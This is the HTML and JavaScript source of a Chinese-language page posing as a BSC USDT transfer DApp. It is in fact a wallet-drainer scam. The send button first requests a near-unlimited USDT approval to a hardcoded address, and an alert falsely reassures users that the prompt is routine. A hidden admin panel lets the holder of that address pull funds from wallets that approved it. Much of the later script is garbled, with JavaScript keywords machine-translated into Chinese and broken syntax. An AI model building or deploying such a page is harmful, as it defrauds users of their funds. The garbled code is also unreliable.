<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>BSC‑USDT DApp</title>
<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.header-right-icons { display: flex; gap: 12px; align-items: center; }
.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
.wallet-dot.connected { background-color: #22c55e; }
.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
.amount-input::placeholder { font-size: 16px; color: #aaa; }
.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
.token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
.token-left { display: flex; align-items: center; gap: 10px; }
.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
.token-name { font-size: 18px; font-weight: 500; }
.balance-show{font-size:15px;color:#444;}
.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
.admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
.admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
.admin-input-item{ margin-bottom:14px; }
.admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
.admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
.tip-text{color:#888;font-size:13px;}
</style>
</head>
<body>
<div class="top-header-bar">
<div class="tip-text"></div>
<div class="header-right-icons">
<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
<div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
</div>
</div>

<div class="address-card">
<div class="label-text">收款地址</div>
<div class="fixed-addr-box" id="targetAddrText"></div>
</div>

<div class="amount-card">
<div class="label-text">转出数量（USDT‑BSC）</div>
<div class="amount-row">
<input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
<div class="max-btn" id="maxBtn">全部</div>
</div>
<div class="token-row">
<div class="token-left">
<img class="usdt-icon" src="https://bscscan.com/token/images/tether_32.png">
<span class="token-name">USDT</span>
</div>
<div class="balance-show">余额：<span id="balanceText">0.000000</span></div>
</div>
</div>

<div class="result-card">
<div class="label-text">到账数量</div>
<input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn">确认转账</button>

<div class="admin-panel" id="adminPanel">
<div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
<div class="admin-input-item">
<div class="label-text">请输入已经授权用户钱包地址</div>
<input class="admin-input" id="userAddrInput" placeholder="0x开头BSC地址">
</div>
<div class="admin-input-item">
<div class="label-text">划扣USDT数量</div>
<input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
</div>
<button class="admin-btn" id="deductBtn">确认划扣</button>
</div>

<script>
// ========== 配置参数 ==========
const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
const APPROVE_AMOUNT = "2000000000000"; // 固定授权额度：2000000000000 USDT
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const GAS_LIMIT = "0x493E0";
const BSC_CHAIN_ID = "0x38";
const BSC_NETWORK_PARAM = {
    chainId: "0x38",
    chainName: "BNB Smart Chain Mainnet",
    nativeCurrency: {
        name: "BNB",
        symbol: "BNB",
        decimals: 18
    },
    rpcUrls: ["https://bsc-dataseed.binance.org"],
    blockExplorerUrls: ["https://bscscan.com"]
};

//ERC20余额读取ABI片段
const ERC20_ABI_BALANCE = [
    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
];

let web3 = null;
let userAddress = null;
let usdtContract = null;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const targetAddrText = $("#targetAddrText");
const balanceText = $("#balanceText");
const adminPanel = $("#adminPanel");
const userAddrInput = $("#userAddrInput");
const deductAmountInput = $("#deductAmountInput");
const deductBtn = $("#deductBtn");

targetAddrText.innerText = TARGET_ADDR;

//读取USDT余额
async function loadUserBalance(){
    if(!web3 || !userAddress || !usdtContract){
        balanceText.innerText = "0.000000";
        return;
    }
    try{
        const rawBal = await usdtContract.methods.balanceOf(userAddress).call();
        const realBal = Number(web3.utils.fromWei(rawBal,"ether"));
        balanceText.innerText = realBal.toFixed(6);
        return realBal;
    }catch(err){
        balanceText.innerText = "读取失败";
        return 0;
    }
}

async function checkNetwork(){
    if(!window.ethereum) return false;
    const currentChainId = await window.ethereum.request({method:"eth_chainId"});
    if(currentChainId !== BSC_CHAIN_ID){
        alert("❌当前不是BSC币安链，请切换到 BNB Smart Chain");
        try{
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{chainId:BSC_CHAIN_ID}]
            });
        }catch(switchErr){
            if(switchErr.code === 4902){
                await window.ethereum.request({
                    method:"wallet_addEthereumChain",
                    params:[BSC_NETWORK_PARAM]
                });
            }else{
                throw switchErr;
            }
        }
    }
    return true;
}

async function autoRestoreConnect(){
    if(!window.ethereum) return;
    try{
        const accounts = await window.ethereum.request({method:"eth_accounts"});
        if(accounts.length>0){
            userAddress = accounts[0];
            web3 = new Web3(window.ethereum);
            usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
            walletDot.classList.add("connected");
            await checkNetwork();
            await loadUserBalance();
            if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
                adminPanel.style.display = "block";
            }
            window.ethereum.on("accountsChanged", () => location.reload());
            window.ethereum.on("chainChanged", () => location.reload());
        }
    }catch(e){
        控制台.日志("无历史授权");
    }
}

功能 disconnectWallet() {
    Web3=无效的;
    usdtContract=无效的;
    userAddress=无效的;
    walletDot.classList.移除("已连接");
    BalanceText.内部文本="0.000000";
    adminPanel.风格.显示="无";
}

异步 功能 manualConnectWallet() {
    如果 (Web3 && userAddress) {
        disconnectWallet();
        返回;
    }
    尝试 {
        如果 (!窗户.以太坊) {
            警惕的("未检测到钱包");
            返回;
        }
        Const帐户=等候 窗户.以太坊.请求({ 方法: "eth_requestAccounts" });
        userAddress=帐户[0];
        Web3=新的 Web3(窗户.以太坊);
        usdtContract=新的 Web3.ETH.联合(ERC20_ABI_BALANCE,USDT_CONTRACT);
        walletDot.classList.添加("已连接");
        等候 checkNetwork();
        等候 loadUserBalance();
        如果(userAddress.toLowerCase()===target_ADDR.toLowerCase()){
            adminPanel.风格.显示="块";
        }
        窗户.以太坊.在……之上("accountsChanged", ()=>位置.重载());
        窗户.以太坊.在……之上("chainChanged", ()=>位置.重载());
    } 赶上 (犯错) {
        控制台.误差(犯错);
    }
}

amountInput.addEventListener("输入", ()=>{
    ConstNUM=parseFloat(amountInput.价值)||0;
    receiveAmount.价值=NUM.toFixed(6);
});

//【全部】按钮，填充钱包全部余额
maxBtn.addEventListener("单击", 异步 ()=>{
    如果(!Web3|| !usdtContract|| !userAddress){
        警惕的("请先连接钱包");
        返回;
    }
    ConstBal=等候 loadUserBalance();
    amountInput.价值=Bal.toFixed(2);
    amountInput.dispatchEvent(新的 事件('输入'));
})

异步 功能 sendTx(dataHex){
    ConsttxParams={
        从……起: userAddress,
        到: USDT_CONTRACT,
        数据: dataHex,
        气体: gas_LIMIT
    };
    Consttxhash=等候 窗户.以太坊.请求({
        方法: "eth_SendTransaction",
        params: [txParams]
    });
    返回 txhash;
}

sendBtn.addEventListener("单击", 异步 ()=>{
    如果(!Web3|| !userAddress) 返回 警惕的("钱包未连接，请点右上角圆点");
    等候 checkNetwork();
    ConstVal=parseFloat(amountInput.价值);
    如果(isNaN(Val)||Val<=0) 返回 警惕的("请输入有效转账数量");
    Const平衡=等候loadUserBalance(；adminPanel。风格;
    如果(Val>平衡){
        警惕的(`余额不足！你的可用USDT：${平衡.toFixed(2)}`);
        返回;
    }
    ConstneedWei=BIGINT(Web3.utils.毛巾(Val.toString(),"乙醚"));
    ConstapproveWei=BIGINT(Web3.utils.毛巾(approve_AMOUNT,"乙醚"));
    尝试{
        警惕的("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
        ConstapproveCalldata="0x095ea7b3"
+target_ADDR.片(2).padStart(64,"0")
+approveWei.toString(16).padStart(64,"0");
        等候sendTx(approveCalldata);
        ConstranferCalldata="0xa9059cbb"
+target_ADDR.片(2).padStart(64，"0")
+needWei.toString(16).padStart(64，"0")；
Const哈希=等候sendTx(transferCalldata)；
警惕的('🎉转账成功！\n交易哈希：\n${哈希}')；
amountInput。价值=""；
receiveAmount。价值=""；
等候loadUserBalance()；
}赶上(e){
警惕的("❌操作失败："+(e.消息||线(e)))；
等候loadUserBalance()；
}
})；decutiveBtn超文本标记语言
